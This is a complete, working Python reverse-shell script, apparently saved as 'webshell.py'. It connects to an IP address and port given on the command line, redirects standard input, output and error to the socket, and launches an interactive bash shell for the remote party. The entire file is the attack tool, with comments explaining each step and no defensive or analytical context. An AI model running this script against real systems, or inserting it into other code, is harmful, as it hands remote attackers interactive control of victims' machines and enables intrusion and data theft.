import socket
import subprocess
import sys
import os

def create_reverse_shell(ip, port):
    try:
        # Create a socket object for network communication
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the specified IP address and port
        s.connect((ip, port))
        print("Connection established with {}:{}".format(ip, port))

        # Redirect stdin (0), stdout (1), and stderr (2) to the socket
        # This links the input and output of the bash shell to the network socket
        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)

        # Execute an interactive bash shell
        # This shell will send its input/output over the network via the socket
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        # If there is any error, print the error message and exit
        print("Failed to create reverse shell: ", str(e))
        sys.exit(1)

if __name__ == "__main__":
    # Check if the correct number of arguments is passed
    if len(sys.argv) != 3:
        print("Usage: python3 webshell.py [IP_ADDRESS] [PORT]")
        sys.exit(1)

    # Extract the IP address and port number from the arguments
    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])

    # Call the function to create the reverse shell
    create_reverse_shell(IP_ADDRESS, PORT)

